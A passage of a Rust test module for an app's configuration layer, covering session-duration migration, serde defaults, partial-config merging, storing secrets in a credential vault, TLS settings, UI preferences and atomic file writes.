            load_app_config().services.auth.session_token_duration_secs,
            2_592_000
        );
        assert_eq!(
            duration_on_disk(&path),
            serde_json::json!(2_592_000),
            "the migration must be written back, not only applied in memory"
        );
    }

    /// Catches: the migration rewriting every deliberate non-default value
    /// (a range check or a "less than new default" test would clobber these).
    #[test]
    #[serial_test::serial]
    fn non_legacy_session_durations_are_left_untouched() {
        crate::credentials::reset_test_faults();
        for value in [3_600u64, 604_800] {
            let dir = TempDir::new().expect("temp dir");
            let _guard = set_config_dir_override(dir.path().to_path_buf());
            let path = write_config_with_duration(dir.path(), Some(value));

            assert_eq!(
                load_app_config().services.auth.session_token_duration_secs,
                value
            );
            assert_eq!(duration_on_disk(&path), serde_json::json!(value));
        }
    }

    /// Catches: the migration treating an absent key (deserialized to the new default)
    /// as a legacy value, or the default regressing to the old 24h.
    #[test]
    #[serial_test::serial]
    fn missing_session_duration_gets_the_new_default() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        write_config_with_duration(dir.path(), None);

        assert_eq!(
            load_app_config().services.auth.session_token_duration_secs,
            2_592_000
        );
    }

    /// Catches: the migration re-running or re-writing the file on every load
    /// (the second load must see 2592000 and leave the file byte-identical).
    #[test]
    #[serial_test::serial]
    fn session_duration_migration_is_idempotent() {
        crate::credentials::reset_test_faults();
        let dir = TempDir::new().expect("temp dir");
        let _guard = set_config_dir_override(dir.path().to_path_buf());
        let path = write_config_with_duration(dir.path(), Some(86_400));

        load_app_config();
        let after_first = fs::read_to_string(&path).unwrap();
        let second = load_app_config();

        assert_eq!(second.services.auth.session_token_duration_secs, 2_592_000);
        assert_eq!(fs::read_to_string(&path).unwrap(), after_first);
    }

    #[test]
    fn app_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = AppConfig {
            shell: Some("/bin/zsh".to_string()),
            progress_tracking: false,
            font_family: "Fira Code".to_string(),
            font_size: 16,
            font_weight: 200,
            theme: "dark".to_string(),
            mcp_server_enabled: true,
            mcp_port: 4000,
            mcp_config_installed: false,
            ide: "cursor".to_string(),
            ego_executable: "/opt/ego/bin/ego".to_string(),
            ego_profile: "coordinator".to_string(),
            ai_chat_workspace: "/srv/chat".to_string(),
            ai_chat_sessions: HashMap::from([(
                "/repo/project".to_string(),
                "session-42".to_string(),
            )]),
            ai_chat_peer_ids: HashMap::from([(
                "/repo/project".to_string(),
                "550e8400-e29b-41d4-a716-446655440a01".to_string(),
            )]),
            ai_chat_launches: HashMap::from([(
                "observer-session".to_string(),
                crate::acp_chat::ChatLaunch {
                    executable: "/opt/observer/ego".to_string(),
                    profile: "coordinator".to_string(),
                    workspace: PathBuf::from("/srv/observer"),
                    peer_id: "550e8400-e29b-41d4-a716-446655440a02".to_string(),
                },
            )]),
            default_font_size: 18,
            attachment_max_bytes: default_attachment_max_bytes(),
            attachment_retention_days: default_attachment_retention_days(),
            services: ServicesConfig {
                server: ServerConfig {
                    enabled: true,
                    port: 8080,
                    ipv6_enabled: true,
                },
                auth: AuthConfig {
                    username: "admin".to_string(),
                    password_hash: "$2b$12$hash".to_string(),
                    session_token: "test-session-token".to_string(),
                    session_token_duration_secs: 3600,
                    lan_auth_bypass: true,
                    ..Default::default()
                },
                tls: TlsConfig::default(),
                relay: RelayConfig::default(),
                push: PushConfig {
                    vapid_subject: "mailto:test@example.com".to_string(),
                    ..PushConfig::default()
                },
            },
            confirm_before_quit: false,
            confirm_before_closing_tab: true,
            max_tab_name_length: 40,
            split_tab_mode: SplitTabMode::Unified,
            tab_ordering_mode: TabOrderingMode::TerminalsFirst,
            tab_cycling_all_types: true,
            tab_tree_enabled: true,
            auto_show_pr_popover: true,
            prevent_sleep_when_busy: true,
            auto_update_enabled: false,
            language: "it".to_string(),
            disabled_plugin_ids: vec!["test-disabled".to_string()],
            update_channel: "nightly".to_string(),
            disabled_agents: vec!["codex".to_string()],
            disabled_mcp_agents: vec!["windsurf".to_string()],
            disabled_native_tools: vec!["plugin_dev_guide".to_string()],
            intent_tab_title: false,
            suggest_followups: false,
            global_hotkey: Some("CommandOrControl+Shift+T".to_string()),
            copy_on_select: true,
            osc52_clipboard: true,
            show_last_prompt: false,
            bell_style: "visual".to_string(),
            collapse_tools: true,
            issue_filter: "assigned".to_string(),
            experimental_features_enabled: false,
            scrollback_reflow: true,
            index_strategy: "active_and_switch".to_string(),
            index_memory_budget_mb: default_index_memory_budget_mb(),
            cursor_style: "bar".to_string(),
            terminal_renderer: "webgl".to_string(),
            // All three default to true, so `false` is the only value that can
            // tell a real round trip from serde handing back the default.
            show_block_timestamps: false,
            show_scrollbar_marks: false,
            block_folding_enabled: false,
            auto_update_plugins_enabled: false,
            standby_timeout_minutes: 5,
            custom_launchers: Vec::new(),
            inline_blame_enabled: true,
        };
        let loaded: AppConfig = round_trip_in_dir(dir.path(), "config.json", &cfg);
        assert_eq!(loaded.shell.as_deref(), Some("/bin/zsh"));
        assert_eq!(loaded.font_size, 16);
        assert_eq!(loaded.ide, "cursor");
        assert_eq!(loaded.ego_executable, "/opt/ego/bin/ego");
        assert_eq!(loaded.ego_profile, "coordinator");
        assert_eq!(loaded.ai_chat_workspace, "/srv/chat");
        assert_eq!(
            loaded.ai_chat_sessions.get("/repo/project"),
            Some(&"session-42".to_string())
        );
        assert_eq!(
            loaded.ai_chat_peer_ids.get("/repo/project"),
            Some(&"550e8400-e29b-41d4-a716-446655440a01".to_string())
        );
        // Catches: conversation launch authority disappears in config serialization.
        assert_eq!(loaded.ai_chat_launches, cfg.ai_chat_launches);
        assert_eq!(loaded.default_font_size, 18);
        assert!(loaded.mcp_server_enabled);
        assert_eq!(loaded.mcp_port, 4000);
        assert!(loaded.services.server.enabled);
        assert_eq!(loaded.services.server.port, 8080);
        assert_eq!(loaded.services.auth.username, "admin");
        assert_eq!(loaded.services.auth.password_hash, "$2b$12$hash");
        assert!(!loaded.confirm_before_quit);
        assert!(loaded.confirm_before_closing_tab);
        assert_eq!(loaded.max_tab_name_length, 40);
        assert_eq!(loaded.split_tab_mode, SplitTabMode::Unified);
        assert!(loaded.prevent_sleep_when_busy);
        assert!(!loaded.auto_update_enabled);
        assert_eq!(loaded.language, "it");
        assert_eq!(
            loaded.disabled_plugin_ids,
            vec!["test-disabled".to_string()]
        );
        assert_eq!(loaded.update_channel, "nightly");
        assert_eq!(loaded.services.auth.session_token_duration_secs, 3600);
        assert!(loaded.services.server.ipv6_enabled);
        assert!(loaded.services.auth.lan_auth_bypass);
        assert_eq!(
            loaded.disabled_native_tools,
            vec!["plugin_dev_guide".to_string()]
        );
        assert!(!loaded.intent_tab_title);
        assert!(!loaded.suggest_followups);
        // These three round-trip through the frontend's `updateAppConfig`
        // load-modify-save. Before they existed on this struct, serde dropped
        // them from every `save_config` payload and the UI silently snapped
        // back to the default on the next load.
        assert!(!loaded.show_block_timestamps);
        assert!(!loaded.show_scrollbar_marks);
        assert!(!loaded.block_folding_enabled);
    }

    #[test]
    fn old_config_without_disabled_native_tools_keeps_config_and_debug_disabled() {
        // A config.json written before the field existed must not expose the
        // `config` and `debug` MCP tools that a fresh install keeps disabled.
        let loaded: AppConfig = serde_json::from_str(
            r#"{"shell":null,"font_family":"JetBrains Mono","font_size":14,"theme":"tokyo-night","worktree_dir":null}"#,
        )
        .unwrap();
        assert_eq!(
            loaded.disabled_native_tools,
            vec!["config".to_string(), "debug".to_string()]
        );
    }

    #[test]
    fn app_config_serde_default_for_new_fields() {
        // Simulate a config.json from before ide/default_font_size existed
        let dir = TempDir::new().unwrap();
        let old_json = r#"{"shell":null,"font_family":"JetBrains Mono","font_size":14,"theme":"tokyo-night","worktree_dir":null}"#;
        let path = dir.path().join("config.json");
        fs::write(&path, old_json).unwrap();
        let loaded: AppConfig = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(loaded.ide, "");
        assert_eq!(loaded.default_font_size, 13);
        assert!(!loaded.mcp_server_enabled);
        assert_eq!(loaded.mcp_port, 3845);
        assert!(!loaded.services.server.enabled);
        assert_eq!(loaded.services.server.port, 9876);
        assert_eq!(loaded.services.auth.username, "");
        assert_eq!(loaded.services.auth.password_hash, "");
        assert!(loaded.confirm_before_quit);
        assert!(loaded.confirm_before_closing_tab);
        assert_eq!(loaded.max_tab_name_length, 25);
        assert_eq!(loaded.split_tab_mode, SplitTabMode::Separate);
        assert!(!loaded.prevent_sleep_when_busy);
        assert!(loaded.auto_update_enabled);
        assert_eq!(loaded.language, "en");
        assert_eq!(loaded.update_channel, "stable");
        assert!(!loaded.services.server.ipv6_enabled);
        assert!(!loaded.services.auth.lan_auth_bypass);
        assert!(loaded.intent_tab_title); // defaults to true
        assert!(loaded.suggest_followups); // defaults to true
        assert!(!loaded.experimental_features_enabled);
        // Every config.json written before these fields existed omits them, and
        // the frontend store hydrates each with `?? true` — the two sides must
        // agree or the Settings toggles read one value and the terminal another.
        assert!(loaded.show_block_timestamps);
        assert!(loaded.show_scrollbar_marks);
        assert!(loaded.block_folding_enabled);
    }

    #[test]
    fn migrate_flat_services_fields() {
        let old_json = r#"{
            "shell": null,
            "font_family": "JetBrains Mono",
            "font_size": 14,
            "theme": "vscode-dark",
            "remote_access_enabled": true,
            "remote_access_port": 8080,
            "remote_access_username": "admin",
            "remote_access_password_hash": "$2b$12$hash",
            "session_token": "tok-123",
            "session_token_duration_secs": 7200,
            "ipv6_enabled": true,
            "lan_auth_bypass": true,
            "relay_enabled": true,
            "relay_url": "wss://relay.example.com",
            "relay_token": "secret",
            "relay_session_id": "sess-1",
            "push_enabled": true,
            "vapid_private_key": "pk",
            "vapid_public_key": "pub",
            "vapid_subject": "mailto:test@example.com"
        }"#;
        let mut val: serde_json::Value = serde_json::from_str(old_json).unwrap();
        migrate_flat_services(&mut val);
        let cfg: AppConfig = serde_json::from_value(val).unwrap();
        assert!(cfg.services.server.enabled);
        assert_eq!(cfg.services.server.port, 8080);
        assert!(cfg.services.server.ipv6_enabled);
        assert_eq!(cfg.services.auth.username, "admin");
        assert_eq!(cfg.services.auth.password_hash, "$2b$12$hash");
        assert_eq!(cfg.services.auth.session_token, "tok-123");
        assert_eq!(cfg.services.auth.session_token_duration_secs, 7200);
        assert!(cfg.services.auth.lan_auth_bypass);
        assert!(cfg.services.relay.enabled);
        assert_eq!(cfg.services.relay.url, "wss://relay.example.com");
        assert_eq!(cfg.services.relay.token, "secret");
        assert_eq!(cfg.services.relay.session_id, "sess-1");
        assert!(cfg.services.push.enabled);
        assert_eq!(cfg.services.push.vapid_private_key, "pk");
        assert_eq!(cfg.services.push.vapid_public_key, "pub");
        assert_eq!(cfg.services.push.vapid_subject, "mailto:test@example.com");
        // Flat fields should be removed after migration
        assert_eq!(cfg.font_family, "JetBrains Mono");
    }

    #[test]
    fn merge_partial_keeps_remote_access_enabled() {
        // The bug: `PUT /config` and the MCP `config` save deserialized a partial
        // body straight into an AppConfig, so `services.server.enabled` fell back
        // to its `false` default and remote access silently died on disk while the
        // bound listener kept serving.
        let mut current = AppConfig::default();
        current.services.server.enabled = true;
        current.services.server.port = 9876;

        let merged = merge_partial_app_config(&current, serde_json::json!({ "font_size": 18 }))
            .expect("partial payload must merge");

        assert!(
            merged.services.server.enabled,
            "a payload that never mentions remote access must not switch it off"
        );
        assert_eq!(merged.services.server.port, 9876);
        assert_eq!(merged.font_size, 18);
    }

    #[test]
    fn merge_partial_honors_an_explicit_disable() {
        // Preserving omitted fields must not make the setting unwritable: a caller
        // that does mention it still wins.
        let mut current = AppConfig::default();
        current.services.server.enabled = true;

        let merged = merge_partial_app_config(
            &current,
            serde_json::json!({ "services": { "server": { "enabled": false } } }),
        )
        .expect("explicit disable must merge");

        assert!(!merged.services.server.enabled);
    }

    #[test]
    fn merge_partial_merges_siblings_and_replaces_lists() {
        // Objects merge key by key, so touching one field under `services.server`
        // leaves its siblings alone; arrays replace wholesale so a caller can
        // still clear a list by sending an empty one.
        let mut current = AppConfig::default();
        current.services.server.enabled = true;
        current.services.server.ipv6_enabled = true;
        current.disabled_plugin_ids = vec!["one".to_string(), "two".to_string()];

        let merged = merge_partial_app_config(
            &current,
            serde_json::json!({
                "services": { "server": { "port": 9999 } },
                "disabled_plugin_ids": []
            }),
        )
        .expect("sibling merge must succeed");

        assert_eq!(merged.services.server.port, 9999);
        assert!(merged.services.server.enabled, "sibling must survive");
        assert!(merged.services.server.ipv6_enabled, "sibling must survive");
        assert!(
            merged.disabled_plugin_ids.is_empty(),
            "list must be cleared"
        );
    }

    #[test]
    fn merge_partial_rejects_a_type_mismatch() {
        let current = AppConfig::default();
        assert!(
            merge_partial_app_config(&current, serde_json::json!({ "font_size": "big" })).is_err(),
            "a wrongly-typed field must fail loudly, not silently default"
        );
    }

    #[test]
    fn server_settings_changed_covers_every_rebind_trigger() {
        let base = AppConfig::default();
        assert!(!server_settings_changed(&base, &base.clone()));

        for mutate in [
            (|c: &mut AppConfig| c.services.server.enabled = true) as fn(&mut AppConfig),
            |c: &mut AppConfig| c.services.server.port = 1234,
            |c: &mut AppConfig| c.services.server.ipv6_enabled = true,
            |c: &mut AppConfig| c.services.auth.username = "admin".to_string(),
            |c: &mut AppConfig| c.services.auth.password_hash = "hash".to_string(),
        ] {
            let mut changed = base.clone();
            mutate(&mut changed);
            assert!(
                server_settings_changed(&base, &changed),
                "every listener-affecting field must trigger a rebind"
            );
        }
    }

    #[test]
    fn migrate_skips_when_services_present() {
        let nested_json = r#"{
            "services": {
                "server": { "enabled": true, "port": 9999, "ipv6_enabled": false },
                "auth": { "username": "user2" },
                "tls": {},
                "relay": {},
                "push": {}
            },
            "remote_access_enabled": false
        }"#;
        let mut val: serde_json::Value = serde_json::from_str(nested_json).unwrap();
        migrate_flat_services(&mut val);
        // `services` already present → migration is a no-op, flat field kept as-is
        let services = val.pointer("/services/server/enabled").unwrap();
        assert_eq!(services, true);
        let port = val.pointer("/services/server/port").unwrap();
        assert_eq!(port, 9999);
        let username = val.pointer("/services/auth/username").unwrap();
        assert_eq!(username, "user2");
        // flat field NOT consumed (migration skipped)
        assert!(val.get("remote_access_enabled").is_some());
    }

    #[test]
    #[serial_test::serial]
    fn app_config_secrets_roundtrip_through_credential_vault() {
        let tmp = TempDir::new().unwrap();
        let _guard = set_config_dir_override(tmp.path().to_path_buf());
        let _ = crate::credentials::delete(crate::credentials::Credential::RemoteSessionToken);
        let _ = crate::credentials::delete(crate::credentials::Credential::RelayToken);
        let _ = crate::credentials::delete(crate::credentials::Credential::PushVapidPrivateKey);

        let mut cfg = AppConfig::default();
        cfg.services.auth.session_token = "session-secret".to_string();
        cfg.services.relay.token = "relay-secret".to_string();
        cfg.services.push.vapid_private_key = "vapid-secret".to_string();
        cfg.services.push.vapid_public_key = "vapid-public".to_string();

        save_app_config(cfg).unwrap();

        let disk: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(tmp.path().join("config.json")).unwrap())
                .unwrap();
        assert!(disk.pointer("/services/auth/session_token").is_none());
        assert_eq!(
            disk.pointer("/services/auth/session_token_exists"),
            Some(&serde_json::Value::Bool(true))
        );
        assert!(disk.pointer("/services/relay/token").is_none());
        assert_eq!(
            disk.pointer("/services/relay/token_exists"),
            Some(&serde_json::Value::Bool(true))
        );
        assert!(disk.pointer("/services/push/vapid_private_key").is_none());
        assert_eq!(
            disk.pointer("/services/push/vapid_private_key_exists"),
            Some(&serde_json::Value::Bool(true))
        );

        let loaded = load_app_config();
        assert_eq!(loaded.services.auth.session_token, "session-secret");
        assert!(loaded.services.auth.session_token_exists);
        assert_eq!(loaded.services.relay.token, "relay-secret");
        assert_eq!(loaded.services.relay.token_exists, Some(true));
        assert_eq!(loaded.services.push.vapid_private_key, "vapid-secret");
        assert!(loaded.services.push.vapid_private_key_exists);
    }

    #[test]
    fn relay_token_exists_omitted_in_json_deserializes_to_none() {
        // Sanity-check the serde attribute itself: a JSON object that never
        // mentions "token_exists" must deserialize to `None`, not `Some(false)`.
        let relay: RelayConfig = serde_json::from_str(
            r#"{"enabled": true, "url": "wss://relay.example.com", "session_id": "abc"}"#,
        )
        .unwrap();
        assert_eq!(relay.token_exists, None);
    }

    #[test]
    fn preserve_redacted_secrets_keeps_relay_token_when_payload_omits_exists_flag() {
        // DATA-1 regression test: an agent MCP `config/save` (or partial PUT
        // /config) that never mentions `relay.token_exists` must NOT delete the
        // stored relay token. Before the fix, `token_exists` was a plain `bool`
        // that defaulted to `false` on omission, which the old guard read as an
        // explicit "no token exists" signal and wiped the stored token.
        let mut current = AppConfig::default();
        current.services.relay.token = "existing-secret".to_string();
        current.services.relay.token_exists = Some(true);

        // Simulate a partial payload: caller only touched an unrelated field,
        // so relay.token / relay.token_exists come back at their JSON defaults
        // (empty string / None) exactly as `#[serde(default)]` would produce
        // for a JSON object that omits both keys.
        let mut incoming = AppConfig::default();
        assert_eq!(incoming.services.relay.token_exists, None);
        assert!(incoming.services.relay.token.is_empty());

        preserve_redacted_app_config_secrets(&mut incoming, &current);

        assert_eq!(incoming.services.relay.token, "existing-secret");
        assert_eq!(incoming.services.relay.token_exists, Some(true));
    }

    #[test]
    fn preserve_redacted_secrets_honors_explicit_relay_token_clear() {
        // The explicit-clear affordance (ServicesTab.tsx sets
        // `token_exists = v.length > 0` on every keystroke of the bearer-token
        // input) must keep working: an incoming payload that explicitly says
        // `token_exists: false` alongside an empty token means "the user
        // cleared this field" and must NOT be restored from `current`.
        let mut current = AppConfig::default();
        current.services.relay.token = "existing-secret".to_string();
        current.services.relay.token_exists = Some(true);

        let mut incoming = AppConfig::default();
        incoming.services.relay.token_exists = Some(false);
        assert!(incoming.services.relay.token.is_empty());

        preserve_redacted_app_config_secrets(&mut incoming, &current);

        assert!(incoming.services.relay.token.is_empty());
        assert_eq!(incoming.services.relay.token_exists, Some(false));
    }

    #[test]
    fn tls_config_serde_variants() {
        // Off variant
        let off: TlsConfig = serde_json::from_str(r#"{"mode":"off"}"#).unwrap();
        assert!(matches!(off, TlsConfig::Off));

        // Empty object → Off (backward compat)
        let empty: TlsConfig = serde_json::from_str(r#"{}"#).unwrap();
        assert!(matches!(empty, TlsConfig::Off));

        // Manual variant
        let manual: TlsConfig = serde_json::from_str(
            r#"{"mode":"manual","cert_path":"/etc/cert.pem","key_path":"/etc/key.pem"}"#,
        )
        .unwrap();
        match manual {
            TlsConfig::Manual {
                cert_path,
                key_path,
            } => {
                assert_eq!(cert_path, "/etc/cert.pem");
                assert_eq!(key_path, "/etc/key.pem");
            }
            _ => panic!("expected Manual variant"),
        }

        // Round-trip Manual
        let json = serde_json::to_string(&TlsConfig::Manual {
            cert_path: "/a.pem".into(),
            key_path: "/b.pem".into(),
        })
        .unwrap();
        let rt: TlsConfig = serde_json::from_str(&json).unwrap();
        assert!(matches!(rt, TlsConfig::Manual { .. }));
    }

    #[test]
    fn notification_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = NotificationConfig {
            enabled: false,
            volume: 0.8,
            sounds: NotificationSounds {
                question: true,
                error: false,
                completion: true,
                warning: false,
                info: true,
                attention: false,
            },
            audio_device: Some("Test Speaker".to_string()),
            silence_remote_completions: true,
            toasts_in_bell: false,
            pr_native_notifications: false,
        };
        let loaded: NotificationConfig = round_trip_in_dir(dir.path(), "notifications.json", &cfg);
        assert!(!loaded.enabled);
        assert!((loaded.volume - 0.8).abs() < f64::EPSILON);
        assert!(loaded.sounds.question);
        assert!(!loaded.sounds.error);
        assert!(!loaded.sounds.attention);
        assert_eq!(loaded.audio_device.as_deref(), Some("Test Speaker"));
        assert!(loaded.silence_remote_completions);
        assert!(!loaded.toasts_in_bell);
        assert!(!loaded.pr_native_notifications);
    }

    /// A config written before the setting existed keeps PR notifications on.
    #[test]
    fn pr_native_notifications_defaults_on() {
        let legacy: NotificationConfig =
            serde_json::from_str(r#"{"enabled":true,"volume":0.5}"#).unwrap();
        assert!(legacy.pr_native_notifications);
    }

    /// A user who never saw the setting keeps the mirroring, so nothing a toast
    /// said is lost. An explicit opt-out survives the round trip.
    #[test]
    fn toasts_in_bell_defaults_on() {
        assert!(NotificationConfig::default().toasts_in_bell);
        let legacy: NotificationConfig =
            serde_json::from_str(r#"{"enabled":true,"volume":0.5}"#).unwrap();
        assert!(legacy.toasts_in_bell);
        let opted_out: NotificationConfig =
            serde_json::from_str(r#"{"toasts_in_bell":false}"#).unwrap();
        assert!(!opted_out.toasts_in_bell);
    }

    /// Orchestrations spawn many workers; a chime per finished worker is noise, so
    /// silencing them is the default. Both the struct default and an older config
    /// file written before the field existed must land on `true`.
    #[test]
    fn silence_remote_completions_defaults_on() {
        assert!(NotificationConfig::default().silence_remote_completions);
        let legacy: NotificationConfig =
            serde_json::from_str(r#"{"enabled":true,"volume":0.5}"#).unwrap();
        assert!(legacy.silence_remote_completions);
        // An explicit opt-out still wins — the default must not overwrite a choice.
        let opted_out: NotificationConfig =
            serde_json::from_str(r#"{"silence_remote_completions":false}"#).unwrap();
        assert!(!opted_out.silence_remote_completions);
    }

    #[test]
    fn ui_prefs_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = UIPrefsConfig {
            sidebar_visible: false,
            sidebar_width: 300,
            diff_panel_visible: true,
            markdown_panel_visible: false,
            notes_panel_visible: false,
            file_browser_panel_visible: true,
            plan_panel_visible: false,
            git_panel_visible: false,
            outline_panel_visible: true,
            references_panel_visible: false,
            ai_chat_panel_visible: false,
            file_browser_view_mode: "tree".to_string(),
            sidebar_density: "rich".to_string(),
            mobile_theme: "vscode-light".to_string(),
            diff_panel_width: 500,
            markdown_panel_width: 450,
            notes_panel_width: 320,
            plan_panel_width: 350,
            git_panel_width: 380,
            settings_nav_width: 200,
            settings_expert_mode: true,
            diff_view_mode: "split".to_string(),
            detached_panels: std::collections::HashMap::from([(
                "activity".to_string(),
                "panel-activity".to_string(),
            )]),
            github_section_collapsed: std::collections::HashMap::from([
                ("issues".to_string(), true),
                ("prs".to_string(), false),
            ]),
        };
        let loaded: UIPrefsConfig = round_trip_in_dir(dir.path(), "ui-prefs.json", &cfg);
        assert!(!loaded.sidebar_visible);
        assert_eq!(loaded.sidebar_width, 300);
        assert_eq!(loaded.sidebar_density, "rich");
        assert_eq!(loaded.mobile_theme, "vscode-light");
        assert_eq!(loaded.diff_panel_width, 500);
        assert_eq!(loaded.markdown_panel_width, 450);
        assert_eq!(
            loaded.detached_panels.get("activity").map(|s| s.as_str()),
            Some("panel-activity")
        );
        assert_eq!(loaded.notes_panel_width, 320);
        assert_eq!(loaded.settings_nav_width, 200);
        assert!(loaded.settings_expert_mode);
        assert_eq!(loaded.diff_view_mode, "split");
        assert_eq!(loaded.github_section_collapsed.get("issues"), Some(&true));
        assert_eq!(loaded.github_section_collapsed.get("prs"), Some(&false));
        assert!(loaded.outline_panel_visible);
        assert!(!loaded.references_panel_visible);
        assert!(!loaded.ai_chat_panel_visible);
        assert_eq!(loaded.file_browser_view_mode, "tree");
    }

    /// A prefs file written before the field existed must still load, with the
    /// map empty so every section falls back to its own default.
    #[test]
    fn ui_prefs_without_github_section_collapsed_defaults_to_empty() {
        let loaded: UIPrefsConfig = serde_json::from_str(r#"{"sidebar_visible":true}"#).unwrap();
        assert!(loaded.github_section_collapsed.is_empty());
    }

    /// A prefs file written before expert mode existed must default it to off,
    /// matching `settings_expert_mode`'s `#[serde(default)]`.
    #[test]
    fn ui_prefs_without_settings_expert_mode_defaults_to_off() {
        let loaded: UIPrefsConfig = serde_json::from_str(r#"{"sidebar_visible":true}"#).unwrap();
        assert!(!loaded.settings_expert_mode);
    }

    /// Every key the frontend puts in the `save_ui_prefs` payload must come
    /// back out of `load_ui_prefs`. Serde drops unknown keys silently, so a
    /// field the frontend sends and the struct does not declare is discarded
    /// without an error anywhere: the panel simply never survives a restart.
    /// These were in exactly that state.
    #[test]
    fn ui_prefs_keeps_every_panel_field_the_frontend_sends() {
        let sent = r#"{
            "outline_panel_visible": true,
            "references_panel_visible": true,
            "ai_chat_panel_visible": true,
            "file_browser_view_mode": "tree"
        }"#;
        let cfg: UIPrefsConfig = serde_json::from_str(sent).unwrap();
        let written = serde_json::to_value(&cfg).unwrap();

        for key in [
            "outline_panel_visible",
            "references_panel_visible",
            "ai_chat_panel_visible",
        ] {
            assert_eq!(
                written.get(key),
                Some(&serde_json::json!(true)),
                "{key} was dropped on the way through UIPrefsConfig"
            );
        }
        assert_eq!(
            written.get("file_browser_view_mode"),
            Some(&serde_json::json!("tree")),
            "file_browser_view_mode was dropped on the way through UIPrefsConfig"
        );
    }

    #[test]
    fn ui_prefs_preserve_mobile_theme_across_json_round_trip() {
        let saved: UIPrefsConfig =
            serde_json::from_str(r#"{"mobile_theme":"vscode-light"}"#).unwrap();
        let reloaded = serde_json::to_value(saved).unwrap();
        assert_eq!(reloaded["mobile_theme"], "vscode-light");
    }

    /// A prefs file written before these fields existed must still load, with
    /// each panel closed and the file browser in tree view.
    #[test]
    fn ui_prefs_panel_fields_default_when_absent() {
        let loaded: UIPrefsConfig = serde_json::from_str(r#"{"sidebar_visible":true}"#).unwrap();
        assert!(!loaded.outline_panel_visible);
        assert!(!loaded.references_panel_visible);
        assert!(!loaded.ai_chat_panel_visible);
        assert_eq!(loaded.file_browser_view_mode, "tree");
        assert_eq!(UIPrefsConfig::default().file_browser_view_mode, "tree");
    }

    /// Serde drops unknown keys silently: the density choice must survive the
    /// round trip, and a prefs file from before it existed must load as "auto".
    #[test]
    fn ui_prefs_keep_sidebar_density_and_default_to_auto() {
        let saved: UIPrefsConfig =
            serde_json::from_str(r#"{"sidebar_density":"compact"}"#).unwrap();
        assert_eq!(
            serde_json::to_value(&saved).unwrap()["sidebar_density"],
            "compact"
        );
        let old: UIPrefsConfig = serde_json::from_str(r#"{"sidebar_visible":true}"#).unwrap();
        assert_eq!(old.sidebar_density, "auto");
    }

    #[test]
    fn ui_prefs_respects_saved_flat_view() {
        let loaded: UIPrefsConfig =
            serde_json::from_str(r#"{"file_browser_view_mode":"flat"}"#).unwrap();
        assert_eq!(loaded.file_browser_view_mode, "flat");
    }

    #[test]
    fn repo_settings_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut map = RepoSettingsMap::default();
        map.repos.insert(
            "/my/repo".to_string(),
            RepoSettingsEntry {
                path: "/my/repo".to_string(),
                display_name: "my-repo".to_string(),
                auto_consolidate_worktrees: true,
                dev_server_url: None,
                base_branch: Some("main".to_string()),
                copy_ignored_files: Some(true),
                copy_untracked_files: None,
                setup_script: Some("npm install".to_string()),
                run_script: Some("npm start".to_string()),
                archive_script: Some("cleanup.sh".to_string()),
                color: String::new(),
                worktree_storage: None,
                prompt_on_create: None,
                delete_branch_on_remove: None,
                auto_archive_merged: None,
                orphan_cleanup: None,
                pr_merge_strategy: None,
                after_merge: None,
                auto_fetch_interval_minutes: None,
                auto_delete_on_pr_close: None,
                mcp_upstreams: None,
                branch_labels: HashMap::new(),
            },
        );
        let loaded: RepoSettingsMap = round_trip_in_dir(dir.path(), "repo-settings.json", &map);
        assert_eq!(loaded.repos.len(), 1);
        let entry = loaded.repos.get("/my/repo").unwrap();
        assert_eq!(entry.display_name, "my-repo");
        assert_eq!(entry.base_branch, Some("main".to_string()));
        assert_eq!(entry.copy_ignored_files, Some(true));
        assert_eq!(entry.copy_untracked_files, None);
        assert_eq!(entry.archive_script, Some("cleanup.sh".to_string()));
        // The frontend owns several repo fields that never reached this struct and
        // are therefore dropped on every save; consolidation must not join them.
        assert!(entry.auto_consolidate_worktrees);
    }

    #[test]
    fn prompt_library_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = PromptLibraryConfig {
            prompts: vec![PromptEntry {
                id: "abc".to_string(),
                label: "Test prompt".to_string(),
                text: "Hello world".to_string(),
                pinned: true,
            }],
        };
        let loaded: PromptLibraryConfig =
            round_trip_in_dir(dir.path(), "prompt-library.json", &cfg);
        assert_eq!(loaded.prompts.len(), 1);
        assert_eq!(loaded.prompts[0].id, "abc");
        assert!(loaded.prompts[0].pinned);
    }

    #[test]
    fn missing_file_returns_default() {
        // load_json_config with a nonexistent file returns default
        let cfg: NotificationConfig = load_json_config("nonexistent-12345.json");
        assert!(cfg.enabled); // default is true
    }

    #[test]
    fn save_json_config_is_atomic() {
        let dir = TempDir::new().unwrap();
        let filename = "atomic-test.json";
        let target = dir.path().join(filename);

        // Write initial content
        let initial = NotificationConfig {
            enabled: false,
            ..NotificationConfig::default()
        };
        let json = serde_json::to_string_pretty(&initial).unwrap();
        fs::write(&target, json).unwrap();

        // Overwrite with new content using save_json_config pattern
        let updated = NotificationConfig {
            enabled: true,
            ..NotificationConfig::default()
        };
        let json2 = serde_json::to_string_pretty(&updated).unwrap();
        let temp = dir
            .path()
            .join(format!("{}.tmp.{}", filename, std::process::id()));
        fs::write(&temp, &json2).unwrap();
        fs::rename(&temp, &target).unwrap();

        // Verify the new content is there
        let loaded: NotificationConfig =
            serde_json::from_str(&fs::read_to_string(&target).unwrap()).unwrap();
        assert!(loaded.enabled);

        // Verify no temp file remains
        assert!(!temp.exists());
    }

    #[test]
    fn persist_atomic_survives_concurrent_writers() {
        use std::sync::Arc;
        use std::thread;

        let dir = TempDir::new().unwrap();
        let target = Arc::new(dir.path().join("concurrent.bin"));

        // Eight writers hammer the SAME target with distinct homogeneous payloads.
        // With a per-call unique temp name no two writers ever share a temp path,
        // so every rename atomically installs a fully-written payload. A per-process
        // temp name (the old bug) would make the writers collide: one truncates the
        // temp while another renames it, yielding a truncated/interleaved file or a
        // rename error (panics the thread).
        let payloads: Vec<Vec<u8>> = (0..8u8).map(|i| vec![b'A' + i; 4096]).collect();
        let mut handles = Vec::new();
        for p in payloads.clone() {
            let target = Arc::clone(&target);
            handles.push(thread::spawn(move || {
                for _ in 0..40 {
